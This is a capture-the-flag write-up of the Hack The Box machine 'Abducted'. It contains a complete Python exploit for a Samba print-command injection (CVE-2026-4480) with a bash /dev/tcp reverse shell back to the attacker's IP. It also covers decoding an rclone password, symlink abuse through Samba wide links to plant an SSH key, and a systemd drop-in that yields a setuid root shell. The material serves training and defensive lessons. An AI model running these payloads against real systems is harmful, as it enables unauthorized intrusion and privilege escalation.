# HTB: Abducted

**Difficulty:** Medium
**OS:** Linux
**Target IP:** 10.129.70.175
**Attacker IP:** 10.10.15.146

---

## 1. Reconnaissance

### Port Scanning

A fast sweep followed by a detailed service scan turned up three open ports — no web service at all, which is unusual and immediately narrowed the attack surface to SSH and Samba.

```
rustscan -a 10.129.70.175
```

```
Open 10.129.70.175:22
Open 10.129.70.175:445
Open 10.129.70.175:139
```

```
nmap -p22,445,139 -sCV 10.129.70.175 -oA nmap/nmap
```

```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
```

With web off the table, Samba was clearly the whole point of this box. Message signing being *enabled but not required* is worth flagging in general (it opens the door to relay attacks), but with no second host or domain controller in play here, that wasn't the angle that mattered — the printer share ended up being the real story.

### SMB Enumeration

```
smbclient -L //10.129.70.175/ -N
```

```
Sharename       Type      Comment
---------       ----      -------
HP-Reception    Printer   Reception printer
projects        Disk      Hartley Group Project Files
transfer        Disk      Staff file transfer
IPC$            IPC       IPC Service (Hartley Group Document Services)
```

Testing anonymous access against each share:

```
smbclient //10.129.70.175/projects -N
```
```
tree connect failed: NT_STATUS_ACCESS_DENIED
```

`projects` and `transfer` both reject guest access outright, but the printer share is different — printers on Samba are frequently left guest-accessible since print queues are treated as low-risk. That, combined with no way to remotely pin the exact Samba patch level (SMB2 negotiation doesn't expose a package version, and `rpcclient srvinfo` just reports a hardcoded `os version 6.1`), pointed toward testing for a known Samba printing vulnerability rather than trying to fingerprint the build first.

---

## 2. Foothold — CVE-2026-4480 (Samba Print Command Injection)

### Understanding the Bug

CVE-2026-4480 is a command injection in Samba's print subsystem. When a print job finishes spooling, `smbd` runs the configured `print command` through `system()`, substituting two macros into the string verbatim: `%s` (the spool file path) and `%J` (the client-supplied job name). Because `%J` comes straight from the client and lands in a shell command with only a single-quote character stripped, any other shell metacharacter — `|`, `;`, `&`, spaces — reaches the shell completely intact.

This only matters if the configured backend actually shells out (`printing = sysv`, as opposed to `printing = cups`, which routes through an API instead), and only if a client can queue a job in the first place — which the guest-accessible `HP-Reception` share allows unauthenticated.

Getting a payload into `%J` isn't as simple as connecting with `smbclient` and setting a job name, though — the legacy RAP print interface sanitizes shell metacharacters before they ever reach the vulnerable substitution. To reach it cleanly, the job has to be submitted directly over the `spoolss` RPC interface, which Samba's own Python bindings expose. The job name set via `StartDocPrinter` becomes `%J`; whatever gets written via `WritePrinter` becomes the spool file body, which is what actually gets executed once the print command runs.

### Confirming the Vulnerability (Out-of-Band Ping Test)

Since this is a blind injection — the print command runs server-side with no output returned — I built a harmless ping-back test before committing to a real payload:

```python
#!/usr/bin/env python3
"""
CVE-2026-4480 - Samba print-command (%J) injection -> Ping Test
"""
import argparse
import sys

try:
    from samba.dcerpc import spoolss
    from samba.param import LoadParm
    from samba.credentials import Credentials
except ImportError:
    sys.exit("[-] Samba Python bindings missing. Install with: sudo apt install python3-samba")

PRINTER_ACCESS_USE = 0x00000008


def ping_test(lhost):
    return ("ping -c 3 %s\n" % lhost).encode()


def exploit(rhost, printer, body):
    lp = LoadParm()
    lp.load_default()
    creds = Credentials()
    creds.guess(lp)
    creds.set_anonymous()

    binding = r"ncacn_np:%s[\pipe\spoolss]" % rhost
    iface = spoolss.spoolss(binding, lp, creds)

    handle = iface.OpenPrinter("\\\\%s\\%s" % (rhost, printer), "",
                               spoolss.DevmodeContainer(), PRINTER_ACCESS_USE)

    info = spoolss.DocumentInfo1()
    info.document_name = "|sh"          # this lands in %J
    info.output_file = None
    info.datatype = "RAW"
    ctr = spoolss.DocumentInfoCtr()
    ctr.level = 1
    ctr.info = info

    iface.StartDocPrinter(handle, ctr)
    iface.StartPagePrinter(handle)
    iface.WritePrinter(handle, body, len(body))
    iface.EndPagePrinter(handle)
    iface.EndDocPrinter(handle)         # this triggers the print command
    iface.ClosePrinter(handle)


def main():
    p = argparse.ArgumentParser()
    p.add_argument("rhost")
    p.add_argument("lhost")
    p.add_argument("-P", "--printer", default="HP-Reception")
    args = p.parse_args()
    body = ping_test(args.lhost)
    exploit(args.rhost, args.printer, body)
    print("[+] Ping test submitted - check tcpdump for ICMP packets!")


if __name__ == "__main__":
    main()
```

Setting `document_name = "|sh"` puts the print command in a state where the spool file itself gets piped into a shell — meaning the *content* of the spool body (whatever the "print job" contains) is what actually executes, with none of the metacharacter restrictions that apply to the job name.

Running it with a listener on the wire confirmed the injection worked:

```
python3 ping.py -P HP-Reception 10.129.70.175 10.10.15.146
```

```
sudo tcpdump -ni tun0 icmp
```

```
16:26:34.798677 IP 10.129.70.175 > 10.10.15.146: ICMP echo request, id 1948, seq 1, length 64
16:26:34.798772 IP 10.10.15.146 > 10.129.70.175: ICMP echo reply, id 1948, seq 1, length 64
16:26:36.050172 IP 10.129.70.175 > 10.10.15.146: ICMP echo request, id 1948, seq 2, length 64
```

ICMP echoes arriving from the target confirmed unauthenticated remote code execution before a single byte of a real payload had been sent.

### Weaponizing It — Reverse Shell

Two things needed care in the real payload: the spool body can't be empty (Samba silently skips the print command entirely for a zero-byte file), and the command has to detach itself, since the print command runs *synchronously* inside `EndDocPrinter` — a foreground reverse shell would hang the RPC call and eventually time out. Wrapping the connect-back in `setsid ... &` solves both.

```python
#!/usr/bin/env python3
"""
CVE-2026-4480 - Samba print-command (%J) injection -> unauthenticated RCE.
"""
import argparse
import sys

try:
    from samba.dcerpc import spoolss
    from samba.param import LoadParm
    from samba.credentials import Credentials
except ImportError:
    sys.exit("[-] Samba Python bindings missing. Install with: sudo apt install python3-samba")

PRINTER_ACCESS_USE = 0x00000008


def reverse_shell(lhost, lport):
    return ("setsid bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1' >/dev/null 2>&1 &\n"
            % (lhost, lport)).encode()


def exploit(rhost, printer, body):
    lp = LoadParm()
    lp.load_default()
    creds = Credentials()
    creds.guess(lp)
    creds.set_anonymous()

    binding = r"ncacn_np:%s[\pipe\spoolss]" % rhost
    iface = spoolss.spoolss(binding, lp, creds)

    handle = iface.OpenPrinter("\\\\%s\\%s" % (rhost, printer), "",
                               spoolss.DevmodeContainer(), PRINTER_ACCESS_USE)

    info = spoolss.DocumentInfo1()
    info.document_name = "|sh"
    info.output_file = None
    info.datatype = "RAW"
    ctr = spoolss.DocumentInfoCtr()
    ctr.level = 1
    ctr.info = info

    iface.StartDocPrinter(handle, ctr)
    iface.StartPagePrinter(handle)
    iface.WritePrinter(handle, body, len(body))
    iface.EndPagePrinter(handle)
    iface.EndDocPrinter(handle)
    iface.ClosePrinter(handle)


def main():
    p = argparse.ArgumentParser()
    p.add_argument("rhost")
    p.add_argument("lhost")
    p.add_argument("lport", type=int)
    p.add_argument("-P", "--printer", default="HP-Reception")
    p.add_argument("-c", "--cmd")
    args = p.parse_args()

    body = (args.cmd.rstrip("\n") + "\n").encode() if args.cmd else reverse_shell(args.lhost, args.lport)
    exploit(args.rhost, args.printer, body)
    print("[+] print job submitted -- check your listener")


if __name__ == "__main__":
    main()
```

```
nc -lvnp 4444
```

```
python3 exploit.py 10.129.70.175 10.10.15.146 4444
```

```
[*] target   : 10.129.70.175 (\\10.129.70.175\HP-Reception)
[+] print job submitted -- check your listener / out-of-band channel
```

```
listening on [any] 4444 ...
connect to [10.10.15.146] from (UNKNOWN) [10.129.70.175] 33102
nobody@abducted:/var/spool/samba$ whoami
nobody
```

✅ **Foothold obtained as `nobody`**, the account the print service itself runs as.

---

## 3. Local Enumeration — Recovering an Offsite Backup Password

Poking around the filesystem as `nobody` led straight to an offsite backup configuration:

```
cat /opt/offsite-backup/rclone.conf
```

```
[offsite]
type = sftp
host = backup.hartley-group.internal
user = svc-backup
pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
shell_type = unix
```

```
cat /opt/offsite-backup/sync.sh
```

```
#!/bin/bash
/usr/bin/rclone --config /opt/offsite-backup/rclone.conf sync /srv/projects offsite:projects
```

The password field isn't plaintext, but `rclone` doesn't actually encrypt these values — it only "obscures" them with a reversible encoding, purely to stop the password from being trivially shoulder-surfed in a config file. Since `rclone` itself ships the decoder, recovering the plaintext is a single command:

```
rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
```

```
iXzvcib3SrpZ
```

---

## 4. Lateral Movement — Password Reuse to `scott`

The backup service password had been reused for a real system account:

```
ssh scott@10.129.70.175
```

```
scott@10.129.70.175's password: iXzvcib3SrpZ
...
scott@abducted:~$ id
uid=1000(scott) gid=1001(scott) groups=1001(scott)
```

✅ **User shell obtained as `scott`, via credential reuse.**

---

## 5. Privilege Escalation — `scott` → `marcus`

### Spotting the Misconfiguration

Reading the Samba configuration as `scott` revealed the `transfer` share was set up dangerously:

```
cat /etc/samba/shares.conf
```

```
[transfer]
   comment = Staff file transfer
   path = /srv/transfer
   valid users = scott
   force user = marcus
   read only = no
   wide links = yes
   browseable = yes
```

```
grep -E 'unix extensions|wide links' /etc/samba/smb.conf
```

```
unix extensions = no
allow insecure wide links = yes
```

Breaking down why this combination is dangerous:

| Setting | What It Means | Why It's a Problem |
|---|---|---|
| `valid users = scott` | scott can authenticate to this share | Gives a foothold into the share at all |
| `force user = marcus` | Every file operation runs as `marcus`, regardless of who authenticated | Anything written through the share is owned by `marcus` |
| `wide links = yes` + `allow insecure wide links = yes` | Samba will follow symlinks that point *outside* the shared directory tree | The share's boundary is no longer a real boundary |
| `read only = no` | Files can be written | Combined with the above, arbitrary files can be planted anywhere on disk, owned by `marcus` |

Samba normally disables `wide links` automatically once `unix extensions` are on, precisely to prevent this kind of escape — but `allow insecure wide links = yes` explicitly overrides that protection.

### Exploiting It — Planting an SSH Key

`scott` owns the `/srv/transfer` directory on disk, so a symlink pointing at `marcus`'s home directory can be planted directly:

```
ssh-keygen -q -t ed25519 -N '' -f /tmp/k
ln -s /home/marcus /srv/transfer/mh
```

Then connect back over SMB (as `scott`, using the recovered backup password) and write through the symlink — Samba follows it out of the share due to `wide links`, and `force user` makes the resulting files/directories belong to `marcus`:

```
smbclient //127.0.0.1/transfer -U 'scott%iXzvcib3SrpZ' \
  -c 'mkdir mh/.ssh; put /tmp/k.pub mh/.ssh/authorized_keys'
```

```
putting file /tmp/k.pub as \mh\.ssh\authorized_keys (46.9 kb/s) (average 46.9 kb/s)
```

The public key now sits inside `marcus`'s own `~/.ssh/authorized_keys`, owned by `marcus` — enough to log straight in with the matching private key:

```
ssh -i /tmp/k marcus@10.129.70.175
```

```
marcus@abducted:~$ id
uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators)
```

✅ **Shell obtained as `marcus`**, via a Samba `wide links` + `force user` file-write primitive.

---

## 6. Privilege Escalation — `marcus` → `root`

### Finding the Delegated Systemd Directory

`marcus` belongs to the `operators` group — the infrastructure team. Searching for anything that group can write revealed a systemd drop-in directory:

```
ls -ld /etc/systemd/system/smbd.service.d
```

```
drwxrws--- 2 root operators 4096 Jun  4 13:41 /etc/systemd/system/smbd.service.d
```

The permission bits break down as: owned by group `operators`, and group-writable (the `s` is the setgid bit, ensuring new files inherit the `operators` group). Any `*.conf` file dropped into this directory gets merged into `smbd.service` the next time the unit is reloaded. Directives like `ExecStartPre=` run *before* the main process starts, as whatever user the service itself runs as — and `smbd` runs as `root`. So writing here is a direct path to arbitrary root command execution, contingent on being able to actually get systemd to apply it.

### Checking What Polkit Allows Without a Password

Reloading a unit file and restarting a root-owned service normally requires root privileges. Whether `operators` has been granted that via `polkit` needed checking directly:

```
for action in $(pkaction); do
  pkcheck --action-id "$action" --process $$ 2>/dev/null && echo "ALLOWED: $action"
done
```

```
ALLOWED: org.freedesktop.login1.inhibit-block-idle
ALLOWED: org.freedesktop.login1.inhibit-delay-shutdown
ALLOWED: org.freedesktop.login1.inhibit-delay-sleep
ALLOWED: org.freedesktop.login1.set-self-linger
ALLOWED: org.freedesktop.systemd1.reload-daemon
```

Most of these are default grants to any active local session and don't matter. The one that does is `org.freedesktop.systemd1.reload-daemon` — `operators` can reload the systemd manager without authenticating. Unit *management* (`manage-units`) doesn't show up explicitly in this blanket check, but that's expected rather than reassuring: the rule granting that action is conditional on the specific unit name (`unit=smbd.service`), and a generic `pkcheck` call carries no unit context, so the condition never evaluates true here even though it will when `systemctl` itself makes the equivalent request — which is exactly why `systemctl restart smbd` specifically returns without a password prompt, while restarting any other unit would ask for one.

### Writing the Malicious Drop-In

Combining the group-writable directory with the passwordless reload/restart delegation gives a direct path to root: write an `ExecStartPre=` directive that gives us a setuid shell, then trigger it.

```
cat > /etc/systemd/system/smbd.service.d/override.conf <<'EOF'
[Service]
ExecStartPre=/bin/cp /bin/bash /tmp/.rb
ExecStartPre=/bin/chmod 4755 /tmp/.rb
EOF
```

```
systemctl daemon-reload
systemctl restart smbd
```

Both commands complete silently — no password prompt, confirming the polkit delegation identified above.

### Cashing In

```
marcus@abducted:~$ /tmp/.rb -p -c '/bin/bash -p'
bash-5.2# whoami
root
```

The `-p` flag is essential here — bash drops elevated privileges from a setuid bit by default unless explicitly told to preserve them.

✅ **Full root compromise of Abducted.**

---

## 7. Summary

| Stage | Technique |
|---|---|
| Recon | `rustscan` + `nmap` → SSH and Samba only, no web service; SMB share listing reveals a guest-accessible printer alongside two authenticated file shares |
| Vulnerability ID | No remote version-pinning possible via SMB2 negotiation or `rpcclient srvinfo`; guest-accessible printer share was the deciding signal pointing at **CVE-2026-4480**, a Samba print-command injection |
| Foothold | Built a custom `spoolss` RPC client using Samba's own Python bindings to bypass RAP-layer sanitization, confirmed the injection blind via an out-of-band ICMP ping-back, then weaponized it into a detached reverse shell → `nobody` |
| Credential recovery | Found an `rclone.conf` for an offsite backup job with an "obscured" (not encrypted) password; decoded it directly with `rclone reveal` |
| Lateral movement | Backup service password reused for the real `scott` system account → SSH access |
| Privesc #1 | Abused a `transfer` Samba share configured with `force user = marcus` + `wide links = yes` + `allow insecure wide links = yes` to symlink into `marcus`'s home directory and plant an SSH key → `marcus` |
| Privesc #2 | `marcus`'s `operators` group owned a group-writable systemd drop-in directory for `smbd.service`, and polkit granted passwordless `daemon-reload` plus a unit-scoped `restart` on `smbd.service` specifically → dropped a setuid-root `bash` via `ExecStartPre` → `root` |

**Root cause / lessons learned:**

- Passing client-supplied data (`%J`, the print job name) into a `system()` call with incomplete sanitization — stripping only single quotes — left every other shell metacharacter available for injection. Print subsystems that shell out to external commands need to treat every substituted field as untrusted input, not just the ones an attacker might obviously abuse.
- A "low-risk" guest-accessible printer share turned out to be the single most dangerous share on the box, precisely because print functionality is often treated as an afterthought compared to file shares.
- `rclone`'s "obscure" encoding is explicitly not intended as real credential protection — it's documented as reversible, and the tool ships its own decoder. Any password recovered from an `rclone.conf` should be treated as plaintext from the start.
- Reusing a backup service account's password for a real interactive login account meant that one recovered config file led directly to a second compromised identity.
- `force user` on a Samba share is meant to simplify permission management, but combined with `wide links` and `allow insecure wide links`, it becomes an arbitrary-file-write-as-another-user primitive — the share boundary stops meaning anything once symlink traversal is allowed outside it.
- Delegating narrow systemd operations via polkit (`reload-daemon`, a unit-scoped `restart`) to an "infrastructure" group is reasonable in principle, but pairing that delegation with a group-writable drop-in directory for the same service closes the loop into full root — the drop-in directory and the polkit grant needed to be evaluated together, not as isolated configuration choices.

---

## 8. Tools Used

- `rustscan`, `nmap` — reconnaissance
- `smbclient`, `rpcclient` — SMB share enumeration and service fingerprinting
- Custom Python exploit using Samba's own `spoolss`/`samba.param`/`samba.credentials` bindings — hand-built CVE-2026-4480 exploit (ping-test and reverse-shell variants)
- `tcpdump` — out-of-band confirmation of blind command injection
- `nc` — catching the reverse shell
- `rclone reveal` — decoding the obscured backup password
- `ssh` — lateral movement via password reuse, and later via a planted SSH key
- `ssh-keygen` + `smbclient` (authenticated) — abusing `force user` + `wide links` to write into another user's home directory
- `pkaction` / `pkcheck` — enumerating polkit-delegated systemd permissions
- systemd drop-in (`ExecStartPre=`) — final privilege escalation to root
